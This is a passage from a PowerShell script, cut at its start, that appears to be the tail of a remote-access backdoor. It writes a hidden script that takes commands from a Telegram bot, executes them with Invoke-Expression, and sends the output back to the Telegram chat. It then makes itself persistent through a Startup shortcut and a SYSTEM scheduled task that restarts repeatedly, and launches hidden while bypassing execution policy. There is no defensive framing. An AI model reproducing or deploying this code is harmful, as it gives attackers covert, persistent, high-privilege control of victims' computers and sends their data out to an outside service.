يح: $pcNum ipconfig";$body=@{chat_id=$cid;text=$errMsg};Invoke-RestMethod "$url/sendMessage" -Method Post -Body $body -ErrorAction 0}catch{};continue};$output=(Invoke-Expression $actualCmd 2>&1|Out-String);if($output.Length -eq 0){$output="✅ تم التنفيذ"};$body=@{chat_id=$cid;text="[$pcNum] $pcName`n`n$output"};Invoke-RestMethod "$url/sendMessage" -Method Post -Body $body -ErrorAction 0}};$lastId|Out-File $lastFile -Force}}catch{}}'|Out-File "$f\TelegramBot.ps1" -Force -Encoding UTF8;$shortcut="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TelegramBot.lnk";$ws=New-Object -ComObject WScript.Shell;$s=$ws.CreateShortcut($shortcut);$s.TargetPath="powershell.exe";$s.Arguments="-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$f\TelegramBot.ps1`"";$s.Save();$taskName="TelegramBotPersistent";$action=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$f\TelegramBot.ps1`"";$trigger=New-ScheduledTaskTrigger -AtStartup;$principal=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest;$settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 999;Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue|Out-Null;Start-Process powershell.exe "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$f\TelegramBot.ps1`"";Stop-Process -Id $PID -Force